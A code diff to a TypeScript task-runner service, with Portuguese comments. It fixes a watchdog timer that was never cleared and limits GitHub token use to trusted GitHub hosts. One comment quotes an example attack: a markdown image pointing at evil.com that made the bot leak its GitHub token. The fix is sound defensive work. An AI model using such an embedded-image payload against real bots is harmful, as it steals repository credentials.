@@ -863,23 +863,31 @@ class TaskRunnerService {
         let release!: () => void;
         this.worktreeLock = new Promise<void>((r) => { release = r; });
         
+        // #1154 P0-2: handle do watchdog p/ poder CANCELAR no caminho feliz (ver finally abaixo).
+        let lockTimer: ReturnType<typeof setTimeout> | undefined;
         try {
             await Promise.race([
                 prev,
-                new Promise<void>((_, reject) => setTimeout(() => {
-                    this.sweepOrphanedOpencode(`lock-timeout-in-${label}`).catch(() => {});
-                    this.cleanStaleLocks(true);
-                    const stuckTask = Object.values(this.store.tasks).find(t => t.status === 'running' || t.status === 'fixing');
-                    if (stuckTask) {
-                        stuckTask.status = 'failed';
-                        stuckTask.error = 'Timeout no worktree lock (holder anterior não liberou dentro do watchdog total)';
-                        this.save();
-                    }
-                    reject(new Error(`worktreeLock timeout: holder anterior não liberou a tempo. Lock abortado para ${label}`));
-                // #963 (aprendizado da task #986, 2026-07-04): era 10min — MENOR que UM run do opencode
-                // (30min) e que o watchdog total (3h), então matava tasks longas LEGÍTIMAS por aquisição
-                // concorrente do lock. Alinha ao watchdog total (o backstop correto): só dispara em deadlock real.
-                }, MAX_TASK_WALL_MS + 5 * 60_000))
+                new Promise<void>((_, reject) => {
+                    lockTimer = setTimeout(() => {
+                        this.sweepOrphanedOpencode(`lock-timeout-in-${label}`).catch(() => {});
+                        this.cleanStaleLocks(true);
+                        const stuckTask = Object.values(this.store.tasks).find(t => t.status === 'running' || t.status === 'fixing');
+                        if (stuckTask) {
+                            stuckTask.status = 'failed';
+                            stuckTask.error = 'Timeout no worktree lock (holder anterior não liberou dentro do watchdog total)';
+                            // #1154 P2: antes marcava failed SEM evento nem emitStatus → morte SILENCIOSA (nem timeline,
+                            // nem notificação). Agora registra e emite (dispara a NOTIFY.failed).
+                            this.recordEvent(stuckTask, 'task_failed', 'Timeout no worktree lock — holder anterior não liberou dentro do watchdog total');
+                            this.save();
+                            this.emitStatus(stuckTask);
+                        }
+                        reject(new Error(`worktreeLock timeout: holder anterior não liberou a tempo. Lock abortado para ${label}`));
+                    // #963 (aprendizado da task #986, 2026-07-04): era 10min — MENOR que UM run do opencode
+                    // (30min) e que o watchdog total (3h), então matava tasks longas LEGÍTIMAS por aquisição
+                    // concorrente do lock. Alinha ao watchdog total (o backstop correto): só dispara em deadlock real.
+                    }, MAX_TASK_WALL_MS + 5 * 60_000);
+                })
             ]);
         } catch (e) {
             // #1114: se a AQUISIÇÃO estoura o watchdog (a race REJEITA), o `release()` do finally abaixo
@@ -888,6 +896,12 @@ class TaskRunnerService {
             // elo AQUI faz a cadeia se auto-curar após um holder pendurado/restart.
             release();
             throw e;
+        } finally {
+            // #1154 P0-2: cancela o TIMER-BOMBA. Antes o setTimeout NUNCA era limpo → 3h05 após CADA
+            // aquisição (inclusive no caminho FELIZ, quando `prev` já resolveu) ele disparava: matava o
+            // opencode LEGÍTIMO da task em curso + marcava uma task inocente como failed (split-brain).
+            // Com o clear, os efeitos colaterais só rodam em DEADLOCK REAL (prev nunca resolve).
+            if (lockTimer) clearTimeout(lockTimer);
         }
         try {
             return await fn();
@@ -1498,11 +1512,24 @@ class TaskRunnerService {
     }
 
     /** Baixa uma imagem (attachment do GitHub costuma exigir o token gh) e devolve base64. null se falhar. */
+    // #1154 P0: só anexa o token do GitHub a hosts CONFIÁVEIS. Antes mandava `Authorization: token <gh>`
+    // p/ QUALQUER url de imagem embutida na issue → um `![x](https://evil.com/a.png)` num comentário de
+    // issue opencode-task exfiltrava o token (escrita+merge no repo) p/ o atacante. Anexos de issue vivem
+    // em github.com/user-attachments e *.githubusercontent.com (que exigem o token); todo o resto é público.
+    private static isTrustedGithubHost(url: string): boolean {
+        try {
+            const h = new URL(url).hostname.toLowerCase();
+            return h === 'github.com' || h === 'githubusercontent.com' || h.endsWith('.githubusercontent.com');
+        } catch { return false; }
+    }
     private async downloadImageBase64(url: string): Promise<string | null> {
         const get = (headers: any) => axios.get(url, { responseType: 'arraybuffer', timeout: 30000, maxContentLength: 15 * 1024 * 1024, headers });
         try {
             let token = '';
-            try { token = (await gh(['auth', 'token'], { timeout: 10000 })).stdout.trim(); } catch { /* sem token — tenta público */ }
+            // NUNCA envia o token a host não-GitHub (evita exfiltração).
+            if (TaskRunnerService.isTrustedGithubHost(url)) {
+                try { token = (await gh(['auth', 'token'], { timeout: 10000 })).stdout.trim(); } catch { /* sem token — tenta público */ }
+            }
             const resp = await get(token ? { Authorization: `token ${token}` } : {});
             return Buffer.from(resp.data).toString('base64');
         } catch {
@@ -1524,7 +1551,12 @@ class TaskRunnerService {
             while ((m = mdRe.exec(text))) urls.add(m[1]);
             const htmlRe = /<img[^>]+src=["'](https?:\/\/[^"']+)["']/gi;
             while ((m = htmlRe.exec(text))) urls.add(m[1]);
-            const imgUrls = [...urls].filter((u) => /user-attachments|githubusercontent|\.(png|jpe?g|gif|webp)(\?|$)/i.test(u)).slice(0, 4);
+            // #1154 P0: só imagens de host CONFIÁVEL do GitHub — evita que o robô SEQUER faça request a
+            // uma URL de atacante (defesa em profundidade além do host-check do token no downloadImageBase64).
+            const imgUrls = [...urls]
+                .filter((u) => /\.(png|jpe?g|gif|webp)(\?|$)/i.test(u) || /\/user-attachments\//i.test(u))
+                .filter((u) => TaskRunnerService.isTrustedGithubHost(u))
+                .slice(0, 4);
             if (!imgUrls.length) return '';
             const parts: string[] = [];
             for (const url of imgUrls) {
